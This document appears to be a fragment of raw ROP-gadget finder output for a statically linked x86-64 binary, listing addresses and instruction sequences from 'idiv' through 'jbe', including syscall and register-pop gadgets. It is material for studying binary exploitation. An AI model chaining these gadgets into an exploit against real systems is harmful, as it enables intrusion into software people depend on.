0x0000000000465984 : idiv bh ; inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x0000000000465496 : idiv bh ; jmp qword ptr [rax]
0x00000000004577a6 : idiv byte ptr [rdx - 1] ; cmovs eax, edx ; ret
0x00000000004b84cd : idiv ecx ; jmp qword ptr [rdx]
0x0000000000464a56 : idiv edi ; call qword ptr [rax]
0x000000000046493e : idiv edi ; dec dword ptr [rax - 0x39] ; ret 0x2c20
0x0000000000471421 : idiv edi ; dec dword ptr [rax - 0x77] ; ret
0x0000000000499b02 : idiv edi ; imul esp, dword ptr [rsi - 0x59940009], -9 ; call qword ptr [rbx]
0x000000000047067d : idiv edi ; inc dword ptr [rcx - 1] ; push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x000000000047f667 : imul al ; and ecx, dword ptr [rsi] ; clc ; dec dword ptr [rax - 0x7d] ; ret
0x000000000048a7c8 : imul al ; ret 0xf75c
0x00000000004601d7 : imul eax ; ret
0x000000000044b681 : imul eax, dword ptr [rcx], 0 ; add dh, dh ; ret 0x7502
0x000000000046ed62 : imul eax, dword ptr [rcx], 0xc7480000 ; ret 0xffe0
0x000000000040166b : imul ecx, dword ptr [rdi], 0x941c095 ; ret 0xf981
0x00000000004b4af7 : imul ecx, dword ptr [rsi], 0x18 ; ret
0x000000000049d701 : imul edi, ebx, -1 ; push 0x6b ; sti ; jmp qword ptr [rdx]
0x000000000049d709 : imul edi, ebx, -1 ; sub byte ptr [rdx - 5], ch ; call rdx
0x000000000049d789 : imul edi, ebx, 0xfb69ccff ; jmp rax
0x000000000040b2c4 : imul edi, edx, -1 ; dec dword ptr [rax - 0x7d] ; ret
0x000000000041ed1e : imul esp, dword ptr [rax + 0x5b], 0x5d ; pop r12 ; ret
0x0000000000467a22 : imul esp, dword ptr [rip + 0x48b4800], -8 ; jmp rax
0x000000000044aafc : imul esp, dword ptr [rsi + 0xf], 0x74 ; ret 0xff3
0x0000000000499b04 : imul esp, dword ptr [rsi - 0x59940009], -9 ; call qword ptr [rbx]
0x00000000004bc6bc : in al, 0x28 ; std ; jmp qword ptr [rdx]
0x000000000044780c : in al, 0x74 ; or dword ptr [rax - 1], ecx ; ret 0xc148
0x0000000000452eb3 : in al, 0x80 ; cli ; cmp eax, 0x83497174 ; ret
0x0000000000465030 : in al, 0xf ; lahf ; ret
0x000000000043b6ea : in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000044e79e : in al, 0xf3 ; ret
0x000000000049bbe1 : in al, 0xf9 ; call rax
0x0000000000425727 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; call rax
0x0000000000416463 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret
0x0000000000427c64 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x2ab
0x0000000000424e64 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x2d9
0x0000000000415264 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x3d5
0x00000000004165f2 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 3
0x00000000004654d4 : in al, dx ; add dword ptr [rax - 0x93b43], eax ; jmp qword ptr [rax]
0x0000000000465311 : in al, dx ; add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x000000000049c2bd : in al, dx ; cli ; jmp qword ptr [rax]
0x0000000000401858 : in al, dx ; cmp rsi, 0 ; jne 0x401827 ; ret
0x0000000000409ac0 : in al, dx ; dec byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xc031
0x00000000004b7104 : in al, dx ; jne 0x4b7103 ; jmp rbx
0x000000000041b541 : in al, dx ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004363ba : in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043baea : in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000042583f : in al, dx ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00000000004312b4 : in al, dx ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000494959 : in al, dx ; sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret
0x00000000004913d4 : in al, dx ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00000000004b05fe : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x4b0591 ; ret 0x48f
0x00000000004b05fd : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x4b0592 ; ret 0x48f
0x00000000004aed03 : in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x000000000048b322 : in eax, 0x48 ; mov eax, esi ; ret
0x00000000004adf99 : in eax, 0x6a ; mov eax, 0x45155e93 ; ret 0x591c
0x0000000000492e9a : in eax, 0x83 ; call qword ptr [rcx]
0x0000000000405c35 : in eax, 0xc4 ; ret
0x000000000046a27d : in eax, 0xdf ; loopne 0x46a20e ; ret
0x00000000004b0bb9 : in eax, 0xe2 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x000000000047b473 : in eax, 0xf ; je 0x47b498 ; add rax, 2 ; ret
0x000000000044ec59 : in eax, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x000000000043b76a : in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000049bba5 : in eax, 0xf9 ; call rax
0x00000000004b0081 : in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x000000000042b1ab : in eax, 2 ; cmovne rax, rdx ; ret
0x000000000046d828 : in eax, dx ; add al, 0x84 ; ror byte ptr [rdi], 0x84 ; ret 0x17
0x00000000004709b8 : in eax, dx ; add dword ptr [rax - 0x91743], eax ; jmp qword ptr [rax]
0x00000000004511ba : in eax, dx ; jne 0x4511d7 ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000451d25 : in eax, dx ; jne 0x451d4f ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000451d58 : in eax, dx ; jne 0x451da8 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451d84 : in eax, dx ; jne 0x451e08 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000496bcf : in eax, dx ; jne 0x496bb1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000496e22 : in eax, dx ; jne 0x496e0f ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004979dc : in eax, dx ; jne 0x4979c7 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044d342 : in eax, dx ; lea rax, qword ptr [rcx - 1] ; ret
0x00000000004361ca : in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043bb6a : in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000041cf32 : in eax, dx ; ret
0x000000000049bbf9 : in eax, dx ; stc ; call rax
0x000000000044d492 : in eax, dx ; sub rax, 1 ; ret
0x0000000000401a42 : in eax, dx ; xor r10, r10 ; ret
0x000000000044d7a8 : inc bl ; cmp dl, 1 ; jb 0x44d7ba ; mov byte ptr [rdi], cl ; ret
0x000000000040185b : inc byte ptr [rax] ; jne 0x401824 ; ret
0x000000000041d522 : inc byte ptr [rbp + 0x738948c9] ; cmp byte ptr [rdi], cl ; ret 0x389
0x000000000045134c : inc byte ptr [rbp - 0x60f0be13] ; ret 0x8545
0x000000000045f375 : inc byte ptr [rbx] ; je 0x45f385 ; ret
0x000000000040740b : inc byte ptr [rcx + 9] ; ret
0x0000000000485dd8 : inc dword ptr [r9 + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000049b5ab : inc dword ptr [rax + 0x10fff9df] ; sar cl, cl ; call rax
0x000000000049bc43 : inc dword ptr [rax + 0x2d] ; cli ; call rax
0x000000000049be1b : inc dword ptr [rax + 0x31] ; cli ; call rax
0x000000000049b54b : inc dword ptr [rax + 0x58fff9a6] ; sar cl, cl ; jmp qword ptr [rax]
0x000000000049b20f : inc dword ptr [rax + 0x5b] ; stc ; push qword ptr [rax] ; pop rsp ; stc ; jmp qword ptr [rax]
0x000000000049b923 : inc dword ptr [rax + 0xa] ; cli ; call rax
0x000000000049b74b : inc dword ptr [rax + 6] ; cli ; call rsi
0x000000000049b5df : inc dword ptr [rax - 0x27] ; stc ; jmp qword ptr [rax]
0x000000000049c22b : inc dword ptr [rax - 0x2f000562] ; lahf ; cli ; jmp qword ptr [rax]
0x000000000049b6b3 : inc dword ptr [rax - 0x3a] ; stc ; call qword ptr [rax - 0x1f000639]
0x000000000049b40b : inc dword ptr [rax - 0x49] ; stc ; call rax
0x000000000049b407 : inc dword ptr [rax - 0x4b] ; stc ; inc dword ptr [rax - 0x49] ; stc ; call rax
0x000000000049b49f : inc dword ptr [rax - 0x50] ; stc ; call qword ptr [rax]
0x000000000049b437 : inc dword ptr [rax - 0x53] ; stc ; jmp qword ptr [rax]
0x000000000049b3af : inc dword ptr [rax - 0x56] ; stc ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; stc ; jmp rax
0x000000000049b53b : inc dword ptr [rax - 0x5f] ; stc ; call qword ptr [rax - 0x1f00065e]
0x000000000049b4e7 : inc dword ptr [rax - 0x66] ; stc ; call qword ptr [rax - 0x1f000665]
0x000000000049c21b : inc dword ptr [rax - 0x67] ; cli ; call qword ptr [rax - 0x1f000566]
0x000000000049c24b : inc dword ptr [rax - 0x6c] ; cli ; call rax
0x000000000047110d : inc dword ptr [rax - 0x91743] ; jmp qword ptr [rax]
0x00000000004659c5 : inc dword ptr [rax - 0x93b43] ; jmp qword ptr [rax]
0x0000000000465986 : inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x000000000044ebff : inc dword ptr [rax] ; add byte ptr [rax], al ; cmove rax, rcx ; pop rbx ; ret
0x0000000000434317 : inc dword ptr [rax] ; add byte ptr [rax], al ; sub eax, ecx ; ret
0x000000000049c163 : inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x000000000049b67f : inc dword ptr [rax] ; fdivr st(1) ; call rax
0x000000000049c2bb : inc dword ptr [rax] ; in al, dx ; cli ; jmp qword ptr [rax]
0x000000000049b3b3 : inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; stc ; jmp rax
0x000000000049b457 : inc dword ptr [rax] ; lodsd eax, dword ptr [rsi] ; stc ; jmp rax
0x000000000049b43f : inc dword ptr [rax] ; mov cl, 0xf9 ; call rax
0x000000000049b913 : inc dword ptr [rax] ; or al, 0xfa ; call qword ptr [rax + 0x20fffa0b]
0x000000000049b73b : inc dword ptr [rax] ; or dl, bh ; call qword ptr [rax + 0x20fffa07]
0x000000000049b21f : inc dword ptr [rax] ; pop rdi ; stc ; push rax ; pop rdi ; stc ; jmp rax
0x000000000049b1fb : inc dword ptr [rax] ; push rsp ; stc ; push qword ptr [rax + 0x55] ; stc ; jmp rax
0x000000000049b557 : inc dword ptr [rax] ; salc ; stc ; jmp rax
0x000000000049b6a3 : inc dword ptr [rax] ; sar ecx, -1 ; push rax ; ret 0xfff9
0x00000000004aacb3 : inc dword ptr [rax] ; test eax, 0xa900fffc ; cld ; call rax
0x00000000004aaca3 : inc dword ptr [rax] ; test eax, 0xa900fffc ; cld ; jmp rax
0x000000000045bc94 : inc dword ptr [rbp + 0x31] ; fisttp dword ptr [rcx - 0x7d] ; ret
0x000000000048284f : inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x00000000004891ac : inc dword ptr [rbp - 0x76b08a40] ; ret
0x00000000004090b0 : inc dword ptr [rbp - 0x7aa48740] ; ror byte ptr [rdi], 0x84 ; ret
0x0000000000400967 : inc dword ptr [rbx + 0x438d01c1] ; call rbx
0x0000000000413e3b : inc dword ptr [rbx - 0x2f7cfe08] ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000494ec9 : inc dword ptr [rbx - 0x38b7f808] ; ret 0xffff
0x00000000004603f0 : inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x00000000004930c3 : inc dword ptr [rbx - 0x7bf0bf1e] ; ret
0x0000000000465944 : inc dword ptr [rbx - 0x8f743] ; call qword ptr [rax]
0x000000000044ecbd : inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000044ec2b : inc dword ptr [rbx] ; pop rbx ; ret
0x0000000000485dd9 : inc dword ptr [rcx + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000049d71b : inc dword ptr [rcx + 0x28fffb6a] ; push -5 ; call qword ptr [rbx]
0x0000000000466d12 : inc dword ptr [rcx + 0x29] ; ret 0x8545
0x0000000000487b12 : inc dword ptr [rcx + rbp - 0x40] ; ret
0x00000000004b290f : inc dword ptr [rcx - 0x260001fc] ; or esi, edi ; jmp rsp
0x000000000049b2b3 : inc dword ptr [rcx - 0x74] ; stc ; call rcx
0x000000000045914e : inc dword ptr [rcx - 0x77] ; ret
0x000000000045c436 : inc dword ptr [rcx - 0x77] ; ret 0x5be9
0x00000000004603f3 : inc dword ptr [rcx - 0x77] ; ret 0x840f
0x000000000047067f : inc dword ptr [rcx - 1] ; push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x000000000049b8bf : inc dword ptr [rdi + rax - 6] ; call rsp
0x000000000049bcef : inc dword ptr [rdx + 0x2f] ; cli ; call rdx
0x000000000049b7f7 : inc dword ptr [rdx + 8] ; cli ; call rdx
0x000000000049b7e7 : inc dword ptr [rdx] ; or bh, dl ; call qword ptr [rdx + 0x22fffa09]
0x000000000049b273 : inc dword ptr [rdx] ; xchg ecx, edi ; call rdx
0x000000000049bcdf : inc dword ptr [rdx] ; xor edx, edi ; call qword ptr [rdx + 0x22fffa30]
0x000000000044653d : inc dword ptr [rip - 0x7cb80000] ; ret 0x4910
0x000000000049b753 : inc dword ptr [rsi + 0xc] ; cli ; call rsi
0x000000000049bdb7 : inc dword ptr [rsi + rbp - 6] ; call rsp
0x000000000049b2fb : inc dword ptr [rsi - 0x73] ; stc ; call rsi
0x0000000000494ca2 : inc dword ptr [rsi*2 + 0x8b80f] ; add byte ptr [rax], al ; ret
0x000000000049bc7b : inc dword ptr [rsi] ; cli ; call qword ptr [rsi + 0x26fffa2d]
0x000000000049c153 : inc eax ; cli ; call rax
0x000000000049b507 : inc eax ; movsb byte ptr [rdi], byte ptr [rsi] ; stc ; call qword ptr [rax]
0x000000000049c2e3 : inc eax ; out dx, eax ; cli ; jmp rax
0x000000000049b6e7 : inc eax ; ret 0xfff9
0x000000000049be3b : inc eax ; sub eax, 0x2d50fffa ; cli ; jmp rax
0x000000000049b51b : inc eax ; xchg eax, esi ; stc ; call qword ptr [rax]
0x0000000000432c6c : inc ebp ; std ; xlatb ; ret 0xe883
0x0000000000478aec : inc ebx ; nop ; xor eax, eax ; ret
0x000000000044d019 : inc ebx ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000049b2af : inc ecx ; mov edi, ecx ; inc dword ptr [rcx - 0x74] ; stc ; call rcx
0x000000000040734c : inc ecx ; ret
0x0000000000407306 : inc ecx ; ret 0x410a
0x00000000004153ce : insb byte ptr [rdi], dx ; add byte ptr [rax + 0x39], cl ; ret
0x000000000046bdda : insb byte ptr [rdi], dx ; add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x000000000041a223 : insb byte ptr [rdi], dx ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x0000000000419ba9 : insb byte ptr [rdi], dx ; add byte ptr [rax - 0x77], cl ; ret 0x294d
0x00000000004668e7 : insb byte ptr [rdi], dx ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000042b29b : insb byte ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000431a34 : insb byte ptr [rdi], dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000407532 : insb byte ptr [rdi], dx ; and al, 0x20 ; add rsp, 0x28 ; ret
0x000000000040a916 : insb byte ptr [rdi], dx ; and al, 0x68 ; je 0x40a961 ; xor edi, edi ; call 0x426b89
0x00000000004954fb : insb byte ptr [rdi], dx ; and al, 8 ; jmp 0x495517
0x00000000004b0bbe : insb byte ptr [rdi], dx ; insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x00000000004640d5 : insb byte ptr [rdi], dx ; ret 0x4c40
0x00000000004b703d : insb byte ptr [rdi], dx ; stc ; call rsp
0x000000000049d715 : insb byte ptr [rdi], dx ; sti ; call rdi
0x000000000049b9d0 : insb byte ptr [rdi], dx ; sti ; stc ; call qword ptr [rdx]
0x000000000042afb0 : insb byte ptr [rdi], dx ; xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x0000000000459e06 : insd dword ptr [rdi], dx ; add al, 0 ; add bh, dh ; ret 0xf800
0x000000000041084f : insd dword ptr [rdi], dx ; add al, 0 ; add byte ptr [rbx - 0x7bf0fe08], al ; ret 4
0x000000000042aeab : insd dword ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000467d83 : insd dword ptr [rdi], dx ; and eax, 0x48b4800 ; clc ; jmp rax
0x0000000000496c52 : insd dword ptr [rdi], dx ; js 0x496ccf ; ret 0x8b48
0x00000000004b0bbf : insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x00000000004aef6d : insd dword ptr [rdi], dx ; ret 0xb9b9
0x000000000040a1bc : insd dword ptr [rdi], dx ; sub eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00000000004afe7f : insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x0000000000457965 : int 0x19
0x000000000040eaaf : int 0x80
0x000000000047ae96 : int1 ; call rbx
0x000000000049c335 : int1 ; cli ; call qword ptr [rax]
0x000000000049c32d : int1 ; cli ; call rax
0x000000000049c331 : int1 ; cli ; push rax ; int1 ; cli ; call qword ptr [rax]
0x000000000045d012 : int1 ; je 0x45d1c1 ; mov rdx, rax ; jmp 0x45cfd9
0x000000000045d417 : int1 ; je 0x45d1c1 ; mov rdx, rax ; jmp 0x45d3de
0x000000000045d48e : int1 ; je 0x45d1c1 ; mov rdx, rax ; jmp 0x45d455
0x000000000044d72b : int1 ; jl 0x44d77c ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d74c : int1 ; jl 0x44d79d ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d75f : int1 ; jl 0x44d7b0 ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d834 : int1 ; jl 0x44d885 ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d88c : int1 ; jl 0x44d8dd ; adc dword ptr [rsi + 3], edx ; ret
0x000000000044d929 : int1 ; jl 0x44d97a ; adc dword ptr [rsi + 7], edx ; ret
0x000000000044ebb5 : int1 ; jmp rcx
0x000000000047884b : int1 ; jne 0x478846 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00000000004852d7 : int1 ; jne 0x4852b4 ; ret
0x000000000044ecd9 : int1 ; mov eax, eax ; ret
0x000000000043b55b : int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000043698f : int1 ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000044caf3 : int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x000000000044ecc0 : int1 ; pop rbx ; mov eax, eax ; ret
0x00000000004b0596 : int1 ; ret 0x5803
0x000000000049bbc5 : int1 ; stc ; call rax
0x000000000044caf7 : int1 ; sub eax, edx ; ret
0x0000000000400966 : iretd ; inc dword ptr [rbx + 0x438d01c1] ; call rbx
0x000000000040c71d : ja 0x40c6fe ; mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043f463 : ja 0x43f467 ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x000000000044ac47 : ja 0x44ac4d ; ret
0x000000000044ac63 : ja 0x44ac6d ; mov dword ptr [rdi], ecx ; ret
0x000000000044aca4 : ja 0x44acb3 ; mov qword ptr [rdi], rcx ; ret
0x000000000044ad29 : ja 0x44ad3d ; ret
0x000000000044ad7f : ja 0x44ad97 ; ret
0x000000000044ae01 : ja 0x44ae1d ; ret
0x000000000044b267 : ja 0x44b271 ; lea rax, qword ptr [rdi + 2] ; ret
0x000000000044b283 : ja 0x44b291 ; mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x000000000044b2d4 : ja 0x44b2e7 ; mov qword ptr [rdi], rcx ; lea rax, qword ptr [rdi + 8] ; ret
0x000000000044b3b9 : ja 0x44b3d1 ; lea rax, qword ptr [rdi + 0x10] ; ret
0x000000000044b42f : ja 0x44b44b ; lea rax, qword ptr [rdi + 0x14] ; ret
0x000000000044b4b1 : ja 0x44b4d1 ; lea rax, qword ptr [rdi + 0x18] ; ret
0x000000000044da34 : ja 0x44da65 ; jb 0x44da46 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044dd94 : ja 0x44ddda ; jb 0x44dda6 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044e1e4 : ja 0x44e242 ; jb 0x44e1f6 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044e7b3 : ja 0x44e7d0 ; jb 0x44e7bf ; mov byte ptr [rdi], cl ; ret
0x000000000044e921 : ja 0x44e958 ; jb 0x44e930 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000044eae9 : ja 0x44eb2e ; jb 0x44eaf8 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000044fb4d : ja 0x44fb5e ; sti ; dec dword ptr [rax - 0x77] ; ret
0x000000000045008b : ja 0x450093 ; ret
0x00000000004500d9 : ja 0x4500e3 ; ret
0x00000000004502e4 : ja 0x450343 ; ret
0x000000000045037a : ja 0x450383 ; ret
0x00000000004503b7 : ja 0x450413 ; ret
0x000000000045044d : ja 0x45045b ; ret
0x000000000045047d : ja 0x45048b ; ret
0x0000000000450687 : ja 0x4506cb ; ret
0x00000000004506fd : ja 0x45070b ; ret
0x0000000000450e56 : ja 0x450e63 ; ret
0x0000000000453390 : ja 0x4533bd ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x00000000004540b5 : ja 0x454109 ; movsxd rax, dword ptr [rbx + rax*4] ; add rax, rbx ; jmp rax
0x0000000000461bb3 : ja 0x461bc3 ; ret
0x000000000046caa2 : ja 0x46ca85 ; mov eax, r9d ; ret
0x000000000047b959 : ja 0x47b927 ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000047c1db : ja 0x47c1e3 ; ret
0x000000000047c22f : ja 0x47c23b ; ret
0x000000000047c550 : ja 0x47c57b ; ret
0x0000000000489a4e : ja 0x489aa0 ; shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000049485d : ja 0x494866 ; sbb eax, eax ; ret
0x00000000004ac109 : ja 0x4ac10a ; jmp rax
0x00000000004b0604 : ja 0x4b058b ; ret 0x48f
0x00000000004035a1 : jae 0x4035b6 ; mov ebx, 0x2e766a0a ; leave ; ret 0x8581
0x00000000004035b1 : jae 0x4035c6 ; mov ebx, 0x2e766a0a ; leave ; ret 0x8581
0x0000000000405d45 : jae 0x405d22 ; add al, ah ; ret
0x0000000000406199 : jae 0x406176 ; add al, ah ; ret
0x000000000041f26d : jae 0x41f295 ; movzx eax, byte ptr [rax] ; ret
0x0000000000423c3d : jae 0x423c4b ; add byte ptr [rax - 0x17], dl ; ret
0x000000000044fffd : jae 0x450002 ; ret
0x000000000045108d : jae 0x451092 ; ret
0x00000000004510bd : jae 0x4510c2 ; ret
0x00000000004510ed : jae 0x4510f2 ; ret
0x00000000004527a0 : jae 0x4527a5 ; ret
0x00000000004527cd : jae 0x4527d2 ; ret
0x0000000000452c14 : jae 0x452c03 ; ret
0x000000000046195e : jae 0x4619a5 ; xor eax, eax ; pop rbx ; ret
0x000000000047c15d : jae 0x47c162 ; ret
0x000000000048655b : jae 0x486505 ; xor eax, eax ; ret
0x000000000048ecd4 : jae 0x48ecb7 ; mov eax, 1 ; ret
0x000000000048f18d : jae 0x48f192 ; ret
0x00000000004957e6 : jae 0x4957f9 ; mov rdx, qword ptr [r15] ; mov rdi, r13 ; call r14
0x00000000004aebc2 : jae 0x4aeba4 ; jo 0x4aec40 ; mov ebp, 0xfb67d10d ; ret
0x00000000004afa5e : jae 0x4afa39 ; push rsi ; pop rdx ; je 0x4afa2e ; ret 0xacfc
0x00000000004b4852 : jae 0x4b4860 ; ret
0x00000000004246f7 : jb 0x4246e1 ; mov byte ptr [rsi + rbx], cl ; mov rax, rsi ; pop rbx ; ret
0x000000000043499a : jb 0x4349aa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434aea : jb 0x434afa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434c3a : jb 0x434c4a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434d8a : jb 0x434d9a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434eda : jb 0x434eea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043502a : jb 0x43503a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043517a : jb 0x43518a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004352ca : jb 0x4352da ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043541a : jb 0x43542a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043556a : jb 0x43557a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004356ba : jb 0x4356ca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043580a : jb 0x43581a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043595a : jb 0x43596a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435aaa : jb 0x435aba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435bfa : jb 0x435c0a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043736a : jb 0x43737a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004374ba : jb 0x4374ca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043760a : jb 0x43761a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043775a : jb 0x43776a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004378aa : jb 0x4378ba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004379fa : jb 0x437a0a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437b4a : jb 0x437b5a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437c9a : jb 0x437caa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437dea : jb 0x437dfa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437f3a : jb 0x437f4a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043808a : jb 0x43809a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004381da : jb 0x4381ea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043832a : jb 0x43833a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043847a : jb 0x43848a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004385ca : jb 0x4385da ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043f03e : jb 0x43f04a ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044d795 : jb 0x44d7a4 ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x000000000044d7a0 : jb 0x44d7b3 ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x000000000044d7ad : jb 0x44d7b5 ; mov byte ptr [rdi], cl ; ret
0x000000000044d9b4 : jb 0x44d9bd ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000044da36 : jb 0x44da44 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044da35 : jb 0x44da45 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044dd96 : jb 0x44dda4 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044e1e6 : jb 0x44e1f4 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000044e7b5 : jb 0x44e7bd ; mov byte ptr [rdi], cl ; ret
0x000000000044e923 : jb 0x44e92e ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000044eaeb : jb 0x44eaf6 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000045d14e : jb 0x45d1bc ; mov rdx, rax ; jmp 0x45d113
0x0000000000467529 : jb 0x467557 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x00000000004035a7 : jbe 0x4035da ; leave ; ret 0x8581
0x00000000004035b7 : jbe 0x4035ea ; leave ; ret 0x8581
0x0000000000415cc1 : jbe 0x415c81 ; mov r11d, 1 ; jmp 0x415c96
0x00000000004172cf : jbe 0x417322 ; add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000431ea6 : jbe 0x431ee5 ; add rax, rdi ; ret
